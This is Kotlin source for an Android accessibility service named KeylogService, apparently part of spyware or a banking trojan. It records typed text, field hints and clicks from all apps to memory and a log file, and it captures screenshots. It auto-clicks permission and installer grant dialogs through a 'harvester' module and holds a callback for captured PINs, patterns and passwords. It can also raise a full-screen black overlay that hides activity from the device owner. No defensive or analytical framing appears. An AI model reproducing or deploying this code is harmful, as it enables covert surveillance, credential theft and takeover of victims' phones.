package com.openaccess.sdk.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.KeyguardManager
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.ColorSpace
import android.hardware.HardwareBuffer
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper

import android.view.Display
import android.view.Gravity
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.FrameLayout
import kotlinx.coroutines.suspendCancellableCoroutine
import java.io.ByteArrayOutputStream
import java.io.File
import java.util.concurrent.Executors
import kotlin.coroutines.resume

class KeylogService : AccessibilityService() {
    companion object {
        private const val TAG = "KeylogService"
        private val textLock = Any()
        var capturedText: String = ""
            private set
        var isRunning = false
            private set
        private var logFile: File? = null
        @JvmStatic var instance: KeylogService? = null
            private set
        private val screenshotExecutor = Executors.newSingleThreadExecutor()

        fun getText(): String = synchronized(textLock) { capturedText }
        private fun appendText(text: String) = synchronized(textLock) {
            capturedText += text
            if (capturedText.length > 50000) capturedText = capturedText.takeLast(25000)
        }

        fun setLogFile(f: File) { logFile = f }

        suspend fun takeScreenshotAsync(): ByteArray? {
            val svc = instance ?: return null
            if (Build.VERSION.SDK_INT < 34) return null
            return suspendCancellableCoroutine { cont ->
                svc.takeScreenshot(Display.DEFAULT_DISPLAY, screenshotExecutor, object : AccessibilityService.TakeScreenshotCallback {
                    override fun onSuccess(result: AccessibilityService.ScreenshotResult) {
                        try {
                            val hb = result.hardwareBuffer
                            val cs = result.colorSpace
                            val bitmap = Bitmap.wrapHardwareBuffer(hb, cs) ?: run { cont.resume(null); return }
                            val stream = ByteArrayOutputStream()
                            bitmap.compress(Bitmap.CompressFormat.PNG, 100, stream)
                            bitmap.recycle()
                            cont.resume(stream.toByteArray())
                        } catch (e: Exception) {
                            
                            cont.resume(null)
                        }
                    }
                    override fun onFailure(errorCode: Int) {
                        
                        cont.resume(null)
                    }
                })
            }
        }
    }

    lateinit var harvester: HarvesterModule
        private set
    private var windowManager: WindowManager? = null
    private var blackOverlay: FrameLayout? = null
    private var keyguardManager: KeyguardManager? = null

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        isRunning = true
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
        harvester = HarvesterModule(this)
        logFile?.let { harvester.setLogFile(it) }
        harvester.setCallback { pin, pattern, password ->
            
        }

        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_FOCUSED or
                    AccessibilityEvent.TYPE_VIEW_CLICKED or
                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED or
                    AccessibilityEvent.TYPE_WINDOWS_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            notificationTimeout = 300
            flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
        }
        serviceInfo = info
        
        
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        var source: AccessibilityNodeInfo? = null
        try {
            source = event.source

            harvester.onAccessibilityEvent(event)

            if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                val pkg = event.packageName?.toString() ?: ""
                if (pkg.contains("com.android.systemui") || pkg.contains("settings") ||
                    pkg.contains("packageinstaller") || pkg.contains("permissioncontroller")) {
                    source?.let { harvester.autoClickGrant(it) }
                }
            }

            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    val text = event.text?.joinToString("") ?: return
                    if (text.isNotEmpty()) {
                        val entry = "[${System.currentTimeMillis()}] ${event.packageName}: $text\n"
                        appendText(entry)
                        logFile?.appendText(entry)
                    }
                }
                AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                    if (source != null) {
                        val hint = getHint(source)
                        if (hint.isNotEmpty()) {
                            val entry = "[${System.currentTimeMillis()}] Focus: $hint\n"
                            appendText(entry)
                            logFile?.appendText(entry)
                        }
                    }
                }
                AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                    val text = event.text?.joinToString("") ?: ""
                    if (text.isNotEmpty()) {
                        val entry = "[${System.currentTimeMillis()}] Click: $text\n"
                        appendText(entry)
                    }
                }
            }
        } catch (e: Exception) {
            
        } finally {
            try { source?.recycle() } catch (_: Exception) {}
        }
    }

    private fun getHint(source: AccessibilityNodeInfo?): String {
        if (source == null) return ""
        return try {
            val hint = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                source.hintText?.toString()
            } else null
            hint ?: source.contentDescription?.toString() ?: ""
        } catch (_: Exception) { "" }
    }

    fun toggleBlackOverlay(enable: Boolean) {
        // Must run on main thread for WindowManager operations
        Handler(Looper.getMainLooper()).post {
            try {
                if (enable) {
                    if (blackOverlay == null) {
                        blackOverlay = FrameLayout(this).apply {
                            setBackgroundColor(Color.BLACK)
                        }
                        val params = WindowManager.LayoutParams(
                            WindowManager.LayoutParams.MATCH_PARENT,
                            WindowManager.LayoutParams.MATCH_PARENT,
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
                            else
                                WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                                    WindowManager.LayoutParams.FLAG_FULLSCREEN,
                            PixelFormat.TRANSLUCENT
                        ).apply { gravity = Gravity.TOP }
                        windowManager?.addView(blackOverlay, params)
                        
                    }
                } else {
                    blackOverlay?.let {
                        try { windowManager?.removeView(it) } catch (_: Exception) {}
                        blackOverlay = null
                        
                    }
                }
            } catch (e: Exception) {
                
            }
        }
    }

    override fun onInterrupt() {
        
        isRunning = false
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        isRunning = false
        toggleBlackOverlay(false)
        screenshotExecutor.shutdown()
        
        
    }
}
